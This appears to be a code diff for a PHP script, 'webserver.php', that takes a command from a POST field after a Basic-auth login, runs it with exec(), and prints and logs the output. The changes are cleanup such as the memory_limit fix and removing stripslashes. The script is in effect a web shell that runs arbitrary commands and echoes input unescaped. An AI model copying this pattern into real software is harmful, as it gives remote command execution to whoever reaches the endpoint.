@@ -30,8 +30,8 @@ function showLogin()
     exit;
 }
 
-$username = $_SERVER['PHP_AUTH_USER'];
-$userpass = $_SERVER['PHP_AUTH_PW'];
+$username = $_SERVER['PHP_AUTH_USER'] ?? null;
+$userpass = $_SERVER['PHP_AUTH_PW'] ?? null;
 if (!isset($username)) {
     showLogin();
 } else {
@@ -42,20 +42,20 @@ if (!isset($username)) {
         $tempDir = '';
         if (isset($_POST['command'])) {
             set_time_limit(0);
-            ini_set('memory_set', '-1');
-            echo "\n (webserver.php) ".stripslashes($_POST['command']);
+            ini_set('memory_limit', '-1');
+            echo "\n (webserver.php) ".$_POST['command'];
 
-            $tempDir = '/tmp/'.sha1(time()).'/';
+            $tempDir = '/tmp/'.uniqid('', true).'/';
             @mkdir($tempDir, 0777, true);
 
-            $dcurrent = getcwd();
+            $originalCwd = getcwd();
             chdir($tempDir);
 
-            exec(stripslashes($_POST['command'].' 2>&1'), $salida);
+            exec($_POST['command'].' 2>&1', $salida);
 
-            chdir($dcurrent);
+            chdir($originalCwd);
 
-            file_put_contents('../log/log_trans.log', stripslashes($_POST['command']).
+            file_put_contents('../log/log_trans.log', $_POST['command'].
                               "\n".implode("\n", $salida)."\n\n\n", FILE_APPEND);
 
             echo implode("\n", $salida);
